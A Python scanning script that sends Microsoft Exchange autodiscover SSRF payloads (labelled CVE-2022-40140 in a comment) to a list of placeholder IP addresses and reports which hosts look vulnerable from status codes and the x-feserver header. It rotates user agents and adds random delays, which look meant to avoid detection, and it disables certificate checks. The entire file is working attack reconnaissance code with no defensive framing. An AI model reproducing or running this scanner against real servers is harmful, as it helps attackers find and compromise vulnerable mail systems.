#!/usr/bin/env python3
import requests
from requests.exceptions import SSLError, ConnectionError, Timeout
import time
import random
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# List of target IP addresses
targets = [
    "<IP_ADDRESS_1>",
    "<IP_ADDRESS_2>",
    "...<IP_ADDRESS_N>"
]

# Chuyển IP thành URL
targets = [f"https://{ip}" for ip in targets]

# Payload SSRF (CVE-2022-40140)
payloads = [
    "/autodiscover/autodiscover.json?a@foo.var/owa/?&Email=autodiscover/autodiscover.json?a@foo.var&Protocol=XYZ&FooProtocol=Powershell",
    "/autodiscover/autodiscover.json?a..foo.var/owa/?&Email=autodiscover/autodiscover.json?a..foo.var&Protocol=XYZ&FooProtocol=Powershell",
    "/autodiscover/autodiscover.json?a..foo.var/owa/?&Email=autodiscover/autodiscover.json?a..foo.var&Protocol=XYZ&FooProtocol=%50owershell"
]

# List of user agents to randomize requests
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48"
]

# Analyze the response from the server
def analyze(response, url, payload):
    if response is None:
        print(f"[-] No response from {url} with payload {payload}")
        return

    try:
        status_code = response.status_code
        headers = response.headers

        print(f"[*] Response from {url}: Status Code = {status_code}, Headers = {headers}")

        if status_code == 200 and "x-feserver" in headers:
            print(f"[+] VULNERABLE: {url} (Status: {status_code}, Payload: {payload})")
            print("    x-feserver:", headers.get("x-feserver"))
        elif status_code == 401 and "x-feserver" in headers:
            print(f"[*] Potential Vulnerability: {url} requires authentication (Status: 401, Payload: {payload})")
            print("    x-feserver:", headers.get("x-feserver"))
        else:
            print(f"[-] Not vulnerable or requires authentication: {url} (Status: {status_code}, Payload: {payload})")
    except Exception as e:
        print(f"[!] Error analyzing response from {url}: {e}")

def check_host_alive(url):
    try:
        headers = {"User-Agent": random.choice(user_agents)}
        response = requests.get(url, headers=headers, timeout=20, verify=False)

        if response is not None:
            status = response.status_code
            print(f"[*] Host {url} responded with status: {status}")
            return status in [200, 401, 403, 500]
        return False
    except (SSLError, ConnectionError, Timeout, Exception) as e:
        print(f"[!] Error checking host {url}: {e}")
        return False

# Send requests to targets with payloads
def run_scan():
    for payload in payloads:
        print(f"\n[*] Checking payload: {payload}")
        active_targets = []

        # Check if hosts are alive
        for url in targets:
            if check_host_alive(url):
                active_targets.append(url)
                print(f"[*] Host alive: {url}")
            else:
                print(f"[-] Host down or not responding: {url}")

        # Send requests to active targets
        for url in active_targets:
            full_url = url + payload
            headers = {"User-Agent": random.choice(user_agents)}
            for attempt in range(3):
                try:
                    response = requests.get(full_url, headers=headers, timeout=20, verify=False)
                    analyze(response, url, payload)
                    break
                except (SSLError, ConnectionError, Timeout, Exception) as e:
                    print(f"[!] Attempt {attempt + 1}/3 failed for {url} with payload {payload}: {e}")
                    if attempt < 2:
                        time.sleep(random.uniform(2.0, 5.0))
                    else:
                        print(f"[-] Failed after 3 attempts for {url}")
            time.sleep(random.uniform(1.0, 3.0))

if __name__ == "__main__":
    print("Starting scan on specific IPs...")
    run_scan()
    print("Scan completed.")
